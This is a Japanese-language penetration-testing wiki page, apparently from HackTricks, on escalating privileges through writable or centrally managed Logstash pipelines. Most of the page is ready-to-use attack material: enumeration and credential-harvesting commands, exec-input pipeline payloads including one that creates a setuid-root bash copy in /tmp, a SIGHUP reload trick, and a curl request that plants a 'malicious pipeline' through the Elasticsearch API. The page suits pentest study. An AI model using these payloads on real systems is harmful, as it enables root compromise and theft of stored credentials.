# Logstash Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash は、**pipelines** と呼ばれる仕組みを通じて **ログを収集、変換、配信** するために使用されます。これらの pipelines は、**input**、**filter**、**output** のステージで構成されます。Logstash が侵害されたマシン上で動作している場合、興味深い側面が生じます。

### Pipeline Configuration

pipelines は **/etc/logstash/pipelines.yml** ファイルで設定されます。このファイルには、pipeline configurations の場所が一覧表示されます。
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
このファイルから、pipeline configurationを含む **.conf** ファイルの場所が分かります。**Elasticsearch output module**を使用する場合、**pipelines**に**Elasticsearch credentials**が含まれていることが一般的です。LogstashはElasticsearchへのデータ書き込みを必要とするため、これらのcredentialsには広範な権限が付与されていることがよくあります。configuration path内のワイルドカードにより、Logstashは指定されたdirectory内で一致するすべてのpipelineを実行できます。

Logstashを`pipelines.yml`ではなく`-f <directory>`で起動すると、そのdirectory内の**すべてのファイルが辞書順で連結され、単一のconfigとしてparse**されます。これにより、攻撃上、次の2つの意味があります。

- `000-input.conf`や`zzz-output.conf`のように配置したファイルによって、最終的なpipelineの組み立て方を変更できる
- malformed fileによってpipeline全体のloadingが妨げられる可能性があるため、auto-reloadに依存する前にpayloadを慎重にvalidateする必要がある

### Compromised Hostでの迅速なEnumeration

Logstashがインストールされているboxでは、次の内容をすばやく確認します。
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
ローカルの monitoring API に到達可能かどうかも確認します。デフォルトでは **127.0.0.1:9600** にバインドされます。これは通常、ホスト上に侵入した後であれば十分です:
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
これは通常、pipeline IDs、runtime の詳細、そして変更した pipeline がロードされたことの確認情報を提供します。

Logstash から回収した Credentials によって **Elasticsearch** にアクセスできるようになることが多いため、[Elasticsearch に関するこちらのページ](../../network-services-pentesting/9200-pentesting-elasticsearch.md)を確認してください。

### 書き込み可能なパイプラインを介した権限昇格

権限昇格を試みるには、まず Logstash service が実行されているユーザーを特定します。通常は **logstash** user です。以下の条件の**いずれか1つ**を満たしていることを確認してください。

- pipeline の **.conf** file に対する **write access** がある **または**
- **/etc/logstash/pipelines.yml** file が wildcard を使用しており、対象 folder に書き込みできる

さらに、以下の条件の**いずれか1つ**を満たす必要があります。

- Logstash service を restart できる **または**
- **/etc/logstash/logstash.yml** file に `config.reload.automatic: true` が設定されている

Configuration 内の wildcard により、この wildcard に一致する file を作成すると command execution が可能になります。たとえば:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
ここで、**interval** は実行頻度を秒単位で決定します。上記の例では、**whoami** コマンドが 120 秒ごとに実行され、その出力が **/tmp/output.log** に送られます。

**/etc/logstash/logstash.yml** で **config.reload.automatic: true** を設定すると、Logstash は再起動なしで、新規または変更された pipeline 設定を自動的に検出して適用します。<sup>[[1]](#references)</sup> ワイルドカードがない場合でも既存の設定を変更できますが、サービスの中断を避けるため注意が必要です。

### より信頼性の高い Pipeline Payload

`exec` input plugin は現在のリリースでも動作し、`interval` または `schedule` のいずれかが必要です。これは Logstash JVM を **fork** して実行するため、メモリに余裕がない場合、Payload が何も表示せずに実行されるのではなく、`ENOMEM` で失敗する可能性があります。

より実用的な privilege-escalation Payload は通常、永続的な artifact を残すものです：
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
再起動権限がなくてもプロセスにシグナルを送信できる場合、LogstashはUnix系システム上で**SIGHUP**によるreloadにも対応しています:<sup>[[1]](#references)</sup>
```bash
kill -SIGHUP $(pgrep -f logstash)
```
すべての plugin が reload に対応しているわけではない点に注意してください。たとえば、**stdin** input は automatic reload を妨げるため、`config.reload.automatic` が常に変更を反映すると考えないでください。<sup>[[1]](#references)</sup>

### Logstash から Secrets を窃取する

code execution だけに注目する前に、Logstash がすでにアクセスできるデータを収集します。

- 平文の credentials は、`elasticsearch {}` outputs、`http_poller`、JDBC inputs、または cloud 関連の設定内にハードコードされていることが多い
- Secure settings は **`/etc/logstash/logstash.keystore`** または別の `path.settings` directory に保存されている場合がある
- keystore password は **`LOGSTASH_KEYSTORE_PASS`** 経由で提供されることが多く、package ベースの install では通常 **`/etc/sysconfig/logstash`** から読み込まれる
- `${VAR}` による Environment-variable expansion は Logstash の startup 時に解決されるため、service environment の確認は有用

Useful checks：
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
これは確認する価値もあります。**CVE-2023-46672** により、特定の状況下で Logstash が機密情報をログに記録する可能性があることが示されました。そのため、post-exploitation 対象ホスト上の古い Logstash ログや `journald` エントリから、現在の config が secrets をインライン保存せず keystore を参照している場合でも、認証情報が漏洩する可能性があります。<sup>[[3]](#references)</sup>

### Centralized Pipeline Management Abuse

環境によっては、ホストがローカルの `.conf` ファイルにまったく依存していない場合があります。**`xpack.management.enabled: true`** が設定されている場合、Logstash は Elasticsearch/Kibana から centrally managed pipelines を取得できます。この mode を有効にすると、ローカルの pipeline configs はもはや source of truth ではありません。<sup>[[2]](#references)</sup>

つまり、別の attack path が存在します。

1. ローカルの Logstash settings、keystore、またはログから Elastic credentials を復元する
2. アカウントが **`manage_logstash_pipelines`** cluster privilege を持っているか確認する
3. centrally managed pipeline を作成または置き換え、次の poll interval で Logstash host に payload を実行させる

この feature で使用される Elasticsearch API は次のとおりです。<sup>[[2]](#references)</sup>
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
これは、ローカルファイルが読み取り専用である一方、Logstash がすでにリモートから pipeline を取得するよう登録されている場合に、特に有用です。

## 参考資料

- [1] [Elastic Docs: Config ファイルの再読み込み](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [2] [Elastic Docs: 集中管理された Pipeline Management の設定](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)
- [3] [Logstash 8.11.1 Security Update (ESA-2023-26) - CVE-2023-46672](https://discuss.elastic.co/t/logstash-8-11-1-security-update-esa-2023-26/347191)

{{#include ../../banners/hacktricks-training.md}}
